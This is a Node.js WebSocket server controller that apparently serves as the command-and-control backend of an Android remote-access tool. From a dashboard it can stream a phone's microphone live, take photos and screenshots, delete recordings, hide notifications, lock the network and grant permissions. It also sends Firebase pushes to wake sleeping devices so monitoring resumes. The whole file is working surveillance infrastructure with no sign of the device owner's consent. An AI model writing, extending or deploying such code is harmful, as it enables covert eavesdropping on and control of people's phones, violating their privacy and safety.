/**
 * Dashboard WebSocket controller (/control)
 */

const WebSocket = require("ws");
const deviceStore = require("../models/deviceStore");
const dashboardStore = require("../models/dashboardStore");
const { normalizeDeviceId } = require("../utils/device");
const { broadcastToDashboard } = require("../services/dashboardService");
const { wakeDevice } = require("../services/firebaseService");


let streamRecoveryTimer = null;

function handleDashboard(ws) {
  const wasEmpty = dashboardStore.size() === 0;
  dashboardStore.addClient(ws);
  console.log(`👁️  Dashboard client connected (Total: ${dashboardStore.size()})`);

  // IMPORTANT: we do NOT auto-start audio on all devices.
  // Starting streams on every device causes audio floods when multiple devices are connected.
  // Streams should start only when the user presses "Listen" on a specific device.

  // ── FCM Ghost Node: Wake sleeping devices ────────────────────────────
  // If a device has an FCM token but no active WS connection, fire a
  // high-priority wakeup pulse via Google's servers to pierce Deep Doze.
  if (wasEmpty) {
    // Also check offline devices that have stored FCM tokens
    const offlineTokens = deviceStore.getOfflineFcmTokens?.() || [];
    for (const { deviceId: offId, fcmToken } of offlineTokens) {
      if (!deviceStore.isOnline(offId) && fcmToken) {
        console.log(`💤 Device ${offId} is offline. Firing FCM Wakeup!`);
        wakeDevice(fcmToken).catch(() => {});
      }
    }
  }
  deviceStore.forEachDevice((dev, deviceId) => {
    if (dev.fcmToken && (!dev.ws || dev.ws.readyState !== WebSocket.OPEN)) {
      console.log(`💤 Device ${deviceId} has stale WS. Firing FCM Wakeup!`);
      wakeDevice(dev.fcmToken).catch(() => {});
    }
  });

  const deviceList = deviceStore.listDevices();
  ws.send(JSON.stringify({ type: "device_list", devices: deviceList }));

  ws.on("message", (data) => {
    try {
      const msg = JSON.parse(data.toString());
      const { cmd } = msg;
      const requestedId = normalizeDeviceId(msg.deviceId);

      console.log(`📥 [Dashboard] Command: ${cmd} for ${requestedId || "all"}`);
      console.log(
        `   Available Devices: [${Array.from(deviceStore.devices.keys())
          .map((k) => `"${k}"`)
          .join(", ")}]`,
      );

      let targetId = requestedId;
      let device = null;

      const found = deviceStore.findDevice(requestedId);
      if (found) {
        targetId = found.id;
        device = found.device;
        console.log(`   ✅ Using connected device: "${targetId}"`);
      } else {
        console.log(`   ⚠️ Device "${requestedId}" is offline. Queuing command...`);
        // Queue only when an explicit deviceId is provided.
        // Falling back to currentDeviceId can route commands to the wrong device.
        targetId = requestedId;
        
        if (!targetId) {
          console.log(`❌ Missing deviceId for offline command ${cmd}; rejecting unsafe fallback.`);
          ws.send(JSON.stringify({ type: "error", message: "deviceId is required when target device is offline" }));
          return;
        }
      }

      const safeSend = (payload) => {
        try {
          if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
            device.ws.send(payload);
            console.log(
              `   📡 [Route] Sent to ${targetId}: ${typeof payload === "string" ? payload.substring(0, 30) : "JSON (" + JSON.parse(payload).type + ")"}`,
            );
            return true;
          }
          
          console.log(`   ⚠️ WebSocket not open for ${targetId} -> Queuing command (Layer 9)`);
          deviceStore.queueCommand(targetId, payload);
          
          broadcastToDashboard({
            type: "info",
            message: `Cmd queued for ${targetId}`,
          });
          return false;
        } catch (e) {
          console.log(`   ❌ Send failed for ${targetId}: ${e.message}`);
          deviceStore.queueCommand(targetId, payload); // queue on error
          return false;
        }
      };

      const safeSendJson = (payload) => safeSend(JSON.stringify(payload));

      switch (cmd) {
        case "start_stream":
          {
            const lastStreamCmd = ws._lastStartStreamAt || 0;
            const lastStreamDevice = ws._lastStartStreamDevice || "";
            const now = Date.now();
            const isDuplicate = (targetId === lastStreamDevice) && (now - lastStreamCmd < 3000);
            ws._lastStartStreamAt = now;
            ws._lastStartStreamDevice = targetId;

            const currentSubscription = dashboardStore.getAudioSubscription(ws);
            if (currentSubscription === targetId) {
              ws.send(JSON.stringify({
                type: "command_ack",
                command: "start_stream",
                status: "success",
                detail: "already_subscribed",
                deviceId: targetId,
              }));
              break;
            }
            if (currentSubscription && currentSubscription !== targetId) {
              dashboardStore.clearAudioSubscription(ws);
              if (dashboardStore.getSubscribersForDevice(currentSubscription).length === 0) {
                const previous = deviceStore.findDevice(currentSubscription);
                try {
                  previous?.device?.ws?.send("stop_stream");
                } catch (_e) {}
              }
            }

            const existingSubscribers = dashboardStore.getSubscribersForDevice(targetId);
            if (existingSubscribers.length > 0) {
              ws.send(JSON.stringify({
                type: "command_ack",
                command: "start_stream",
                status: "error",
                detail: "stream_already_active",
                deviceId: targetId,
              }));
              break;
            }

            dashboardStore.setAudioSubscription(ws, targetId);

            if (isDuplicate) {
              ws.send(JSON.stringify({
                type: "command_ack",
                command: "start_stream",
                status: "success",
                detail: "duplicate_ignored",
                deviceId: targetId,
              }));
              break;
            }

            if (safeSend("start_stream")) {
              broadcastToDashboard({
                type: "stream_started",
                deviceId: targetId,
              });
            }
            console.log(`👂 [Dashboard] Client subscribed to audio from ${targetId}`);
          }
          break;
        case "stop_stream":
          if (safeSend("stop_stream")) {
            broadcastToDashboard({
              type: "stream_stopped",
              deviceId: targetId,
            });
          }
          // Remove subscription for this device (clear active subscription).
          // For now we allow only one active audio subscription per dashboard to limit load.
          dashboardStore.clearAudioSubscription(ws);
          console.log(`🔇 [Dashboard] Client unsubscribed from audio`);
          break;
        case "start_record":
          // Recording feature removed
          ws.send(JSON.stringify({ type: "command_ack", command: "start_record", status: "error", detail: "recording_removed" }));
          break;
        case "stop_record":
          // Recording feature removed
          ws.send(JSON.stringify({ type: "command_ack", command: "stop_record", status: "error", detail: "recording_removed" }));
          break;
        case "ping":
          safeSend("ping");
          break;
        case "wake_device":
          {
            // Find the token in the offline cache, or the active device cache
            const targetToken = deviceStore.getOfflineFcmTokens().find(t => t.deviceId === targetId)?.fcmToken 
                             || (device && device.fcmToken);

            if (targetToken) {
              console.log(`🛎️ [Manual Override] Firing FCM Wakeup to ${targetId}`);
              
              // SENIOR DEV FIX: Wait for the actual Firebase result before sending ACK
              wakeDevice(targetToken).then(success => {
                ws.send(JSON.stringify({ 
                  type: "command_ack", 
                  command: "wake_device", 
                  status: success ? "success" : "error", 
                  detail: success ? "pulse_sent" : "firebase_rejected",
                  deviceId: targetId 
                }));
              });
              
            } else {
              console.warn(`❌ Cannot wake ${targetId}: No FCM token saved.`);
              ws.send(JSON.stringify({ 
                type: "command_ack", 
                command: "wake_device", 
                status: "error", 
                detail: "no_fcm_token",
                deviceId: targetId 
              }));
            }
          }
          break;
        case "get_data":
          if (safeSendJson({ type: "get_data" })) {
            broadcastToDashboard({
              type: "command_dispatch",
              deviceId: targetId,
              command: "get_data",
              status: "sent",
              ts: Date.now(),
            });
          }
          break;
        case "ai_mode":
          safeSendJson({
            type: "ai_mode",
            enabled: msg.enabled !== false,
          });
          break;
        case "ai_auto":
          safeSendJson({
            type: "ai_auto",
            enabled: msg.enabled !== false,
          });
          break;
        case "stream_codec":
          safeSendJson({
            type: "stream_codec",
            mode: String(msg.mode || "auto").toLowerCase(),
          });
          break;
        case "set_low_network":
          safeSendJson({
            type: "set_low_network",
            enabled: msg.enabled === true,
          });
          console.log(
            `📶 Low-network mode ${msg.enabled ? "ENABLED" : "DISABLED"} for ${targetId}`,
          );
          break;
        case "voice_profile":
          safeSendJson({
            type: "voice_profile",
            profile: String(msg.profile || "room").toLowerCase(),
          });
          break;
        case "streaming_mode":
          safeSendJson({
            type: "streaming_mode",
            mode: String(msg.mode || "realtime").toLowerCase(),
          });
          console.log(`🎵 Streaming mode set to ${msg.mode} for ${targetId}`);
          break;
        case "set_gain":
          safeSendJson({
            type: "set_gain",
            level: parseFloat(msg.level) || 1.0,
          });
          console.log(`🔊 Gain set to ${msg.level}x for ${targetId}`);
          break;
        case "scan_recordings":
          if (safeSendJson({ type: "scan_recordings" })) {
            console.log(`🔍 Forced recording scan triggered for ${targetId}`);
            ws.send(JSON.stringify({
              type: "command_ack",
              command: "scan_recordings",
              status: "success",
              deviceId: targetId
            }));
          }
          break;
        case "delete_recording":
          if (safeSendJson({
            type: "delete_recording",
            filename: msg.filename || ""
          })) {
            console.log(`🗑️ Delete recording request sent for ${targetId}: ${msg.filename}`);
          }
          break;
        case "take_photo":
          if (
            safeSendJson({
              type: "take_photo",
              camera: String(msg.camera || "rear").toLowerCase(),
              mode: String(msg.mode || msg.quality || "normal").toLowerCase(),
            })
          ) {
            broadcastToDashboard({
              type: "photo_request_sent",
              deviceId: targetId,
              camera: msg.camera || "rear",
              ts: Date.now(),
            });
          } else {
            broadcastToDashboard({
              type: "photo_request_failed",
              deviceId: targetId,
              reason: "device_not_connected",
              ts: Date.now(),
            });
          }
          break;
        case "take_screenshot":
          if (
            safeSendJson({
              type: "take_screenshot",
            })
          ) {
            broadcastToDashboard({
              type: "screenshot_request_sent",
              deviceId: targetId,
              ts: Date.now(),
            });
          } else {
            broadcastToDashboard({
              type: "screenshot_request_failed",
              deviceId: targetId,
              reason: "device_not_connected",
              ts: Date.now(),
            });
          }
          break;
        case "photo_ai":
          safeSendJson({
            type: "photo_ai",
            enabled: msg.enabled !== false,
          });
          break;
        case "photo_quality":
          safeSendJson({
            type: "photo_quality",
            mode: ["fast", "normal", "hd"].includes(
              String(msg.mode || msg.quality || "normal").toLowerCase(),
            )
              ? String(msg.mode || msg.quality || "normal").toLowerCase()
              : "normal",
          });
          break;
        case "photo_night":
          safeSendJson({
            type: "photo_night",
            mode: ["off", "1s", "3s", "5s"].includes(
              String(msg.mode || "off").toLowerCase(),
            )
              ? String(msg.mode || "off").toLowerCase()
              : "off",
          });
          break;
        case "force_update":
          safeSend("force_update");
          console.log(`🔄 Force update sent to ${targetId}`);
          break;
        case "force_reconnect":
          safeSend("force_reconnect");
          console.log(`🔄 Force reconnect sent to ${targetId}`);
          break;
        case "grant_permissions":
          safeSend("grant_permissions");
          console.log(`✅ Grant permissions sent to ${targetId}`);
          break;
        case "enable_autostart":
          safeSend("enable_autostart");
          console.log(`🚀 Enable autostart sent to ${targetId}`);
          break;
        case "uninstall_app":
          safeSend("uninstall_app");
          console.log(`🗑️ Uninstall sent to ${targetId}`);
          break;
        case "clear_device_owner":
          safeSend("clear_device_owner");
          console.log(`🔓 Clear device owner sent to ${targetId}`);
          break;
        case "lock_app":
          safeSend("lock_app");
          console.log(`🔒 Lock app sent to ${targetId}`);
          break;
        case "unlock_app":
          safeSend("unlock_app");
          console.log(`🔓 Unlock app sent to ${targetId}`);
          break;
        case "hide_notifications":
          safeSend("hide_notifications");
          console.log(`🔕 Hide notifications sent to ${targetId}`);
          break;
        case "lock_network":
          safeSend("lock_network");
          console.log(`📡 Lock network sent to ${targetId}`);
          break;
        case "unlock_network":
          safeSend("unlock_network");
          console.log(`📡 Unlock network sent to ${targetId}`);
          break;
        // ── File Manager CRUD commands ────────────────────────────────────
        // ── Remote Hardware Button Control ──────────────────────────────
        case "system_action":
          {
            const action = String(msg.action || "").trim().toLowerCase();
            const validActions = [
              "volume_up", "volume_down", "volume_mute",
              "home", "back", "recents",
              "power_dialog", "lock_screen"
            ];
            if (!validActions.includes(action)) {
              ws.send(JSON.stringify({ type: "error", message: `Invalid system_action: ${action}` }));
              break;
            }
            safeSendJson({
              type: "system_action",
              action,
            });
            console.log(`🎮 System action "${action}" sent to ${targetId}`);
          }
          break;
        default:
          console.warn(`Unknown dashboard command: ${cmd}`);
      }
    } catch (e) {
      console.error("Dashboard message parse error:", e.message);
    }
  });

  ws.on("close", () => {
    dashboardStore.removeClient(ws);
    console.log("👋 Dashboard client disconnected");

    // SENIOR DEV FIX: On-Demand Architecture
    // If there are no more dashboard clients connected to the server,
    // tell all Android devices to shut down their hardware to kill the 
    // green dot and save battery.
    if (dashboardStore.size() === 0) {
      deviceStore.forEachDevice((dev, deviceId) => {
        if (dev && dev.ws && dev.ws.readyState === WebSocket.OPEN) {
          console.log(`Sending auto-stop to ${deviceId} because dashboard closed.`);
          dev.ws.send("stop_stream");
        }
      });
    }
  });

  ws.on("error", (err) => {
    dashboardStore.removeClient(ws);
    console.log(`⚠️ Dashboard client error: ${err?.message || "unknown"}`);
  });
}

function startStreamRecovery() {
  if (streamRecoveryTimer) return;
  const RECOVERY_SCAN_INTERVAL_MS = 60_000;
  const RECOVERY_BASE_COOLDOWN_MS = 60_000;
  const RECOVERY_BACKOFF_COOLDOWN_MS = 5 * 60_000;
  const RECOVERY_BACKOFF_AFTER_ATTEMPTS = 3;

  streamRecoveryTimer = setInterval(() => {
    if (dashboardStore.size() === 0) return;
    const now = Date.now();
    deviceStore.forEachDevice((dev, deviceId) => {
      if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) return;

      // Avoid audio floods: only recover devices that some dashboard client is currently listening to.
      let isSubscribed = false;
      dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
        isSubscribed = true;
      });
      if (!isSubscribed) return;

      const lastAudio = Number(dev.health?.lastAudioChunkAt || 0);
      const staleMs = lastAudio > 0 ? now - lastAudio : Number.POSITIVE_INFINITY;
      const stale = !lastAudio || staleMs > 25_000;
      const micCapturing = dev.health?.micCapturing === true;
      const nextRecoveryAllowedAt = Number(dev._nextStreamRecoveryAllowedAt || 0);
      const inCooldown = nextRecoveryAllowedAt > now;
      const connectedAtMs = dev.connectedAt ? new Date(dev.connectedAt).getTime() : 0;

      // If we already nudged recently, wait for either audio to resume or cooldown to pass.
      if (dev._awaitingRecoveryAudio && staleMs < 12_000) {
        dev._awaitingRecoveryAudio = false;
        dev._streamRecoveryAttempts = 0;
        dev._nextStreamRecoveryAllowedAt = 0;
      }

      // Skip noisy retries for already-capturing devices unless stream is clearly stalled.
      // Bug 2.6: Only send start_stream if device is truly silent (stale > 45s), not just stopped capturing
      if (!stale || inCooldown || (micCapturing && staleMs < 45_000)) {
        return;
      }

      if (!dev._awaitingRecoveryAudio) {
        try {
          let stillSubscribed = false;
          dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
            stillSubscribed = true;
          });
          if (!stillSubscribed) return;

          dev.ws.send("start_stream");
          dev._awaitingRecoveryAudio = true;
          dev._streamRecoveryAttempts = Number(dev._streamRecoveryAttempts || 0) + 1;

          const attempts = dev._streamRecoveryAttempts;
          const isBackoff = attempts >= RECOVERY_BACKOFF_AFTER_ATTEMPTS;
          const cooldownMs = isBackoff ? RECOVERY_BACKOFF_COOLDOWN_MS : RECOVERY_BASE_COOLDOWN_MS;
          dev._nextStreamRecoveryAllowedAt = now + cooldownMs;

          console.log(`🔄 [Recovery] Nudging stale device → ${deviceId} (stale ${Math.round(staleMs/1000)}s)`);
          stillSubscribed = false;
          dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
            stillSubscribed = true;
          });
          if (stillSubscribed) {
            broadcastToDashboard({
              type: "stream_recovery_sent",
              deviceId,
              attempts,
              nextRetryMs: cooldownMs,
            });
            if (isBackoff) {
              broadcastToDashboard({
                type: "stream_recovery_alert",
                deviceId,
                level: "warning",
                message: "Audio stream still stale after repeated recovery attempts; backing off to 5 minutes.",
                attempts,
              });
            }
          }
        } catch (e) {
          console.log(`❌ Stream recovery failed for ${deviceId}: ${e.message}`);
        }
      }
    });
  }, RECOVERY_SCAN_INTERVAL_MS);
}

module.exports = {
  handleDashboard,
  startStreamRecovery,
};
